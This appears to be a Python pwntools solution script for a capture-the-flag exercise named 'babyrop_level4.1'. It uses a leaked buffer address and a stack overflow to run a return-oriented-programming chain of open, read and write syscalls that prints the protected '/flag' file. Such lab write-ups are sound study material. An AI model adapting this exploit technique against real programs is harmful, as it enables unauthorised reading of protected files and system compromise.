from pwn import *

context.log_level = 'debug'
offset = b'a' * 48 #56 is offset between buf and ret addr

poprax_ret = p64(0x401aee)
poprdi_ret = p64(0x401b15)
poprsi_ret = p64(0x401af5)
poprdx_ret = p64(0x401ae5)
syscall    = p64(0x401afd)


r = process('/challenge/babyrop_level4.1')

r.recvuntil(b'[LEAK] Your input buffer is located at:')
buf = int(r.recvn(15), 16) #also the address of /flag
print(f'Buf: {hex(buf)}')

payload = b'/flag\x00\x00\x00'                      #null byte to get the correct string
payload += offset

#I will open '/flag'
payload += poprax_ret
payload += p64(0x02)                                #syscall open
payload += poprdi_ret
payload += p64(buf)                                 #pointer to string
payload += poprsi_ret
payload += p64(0)
payload += syscall



#I will read '/flag' and save it to the stack, I think it may be after buf, addr of it: buf + 0x8
payload += poprdi_ret
payload += p64(3)                                   #I guess file descriptor will return value 3
payload += poprsi_ret
payload += p64(buf + 0x8)                           #I will get the content in "/flag" into this address
payload += poprax_ret
payload += p64(0)                                   #syscall read
payload += poprdx_ret
payload += p64(100)                                 #the size I want to read
payload += syscall

#Afterwards, I will print it

payload += poprax_ret
payload += p64(0x01)                                #syscall write
payload += poprdi_ret                               #stdout
payload += p64(1)
payload += poprsi_ret                               
payload += p64(buf + 0x8)                           #the address save my buf which contain flag
payload += poprdx_ret
payload += p64(100)                                 #size to write 
payload += syscall

r.recvuntil(b'\n')

with open("run", 'wb') as file:
    file.write(payload)
r.sendline(payload)

r.interactive()